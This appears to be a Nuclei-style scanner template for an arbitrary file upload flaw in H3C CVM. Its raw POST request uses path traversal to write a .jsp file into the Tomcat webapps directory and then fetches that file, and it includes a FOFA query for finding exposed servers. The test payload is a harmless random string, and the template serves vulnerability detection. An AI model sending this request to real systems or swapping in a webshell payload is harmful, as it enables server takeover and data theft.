http:
- matchers:
  - part: body_2
    type: word
    words:
    - '{{payload}}'
  - part: header
    type: word
    words:
    - 'Content-Type: text/html'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp&name=222"
    HTTP/1.1

    Host: {{Hostname}}

    Content-range: bytes 0-10/20

    Accept-Encoding: gzip, deflate


    {{payload}}

    '
  - 'GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: h3c-cvm-arbitrary-file-upload
info:
  author: SleepingBag945
  description: 'An H3C CVM vulnerability allows for arbitrary file uploads. This enables
    attackers to upload any files they choose, acquire webshells, manipulate server
    permissions, and access sensitive information.

    '
  metadata:
    fofa-query: server="H3C-CVM"
    max-request: 2
    verified: true
  name: H3C CVM - Arbitrary File Upload
  reference:
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/h3c-cvm-fileupload.yaml
  - https://github.com/tr0uble-mAker/POC-bomber/blob/main/pocs/redteam/h3c_cvm_fileupload_2022.py
  severity: critical
  tags: h3c,lfi,instrusive,file-upload,intrusive
variables:
  filename: '{{rand_base(5)}}'
  payload: '{{rand_base(8)}}'
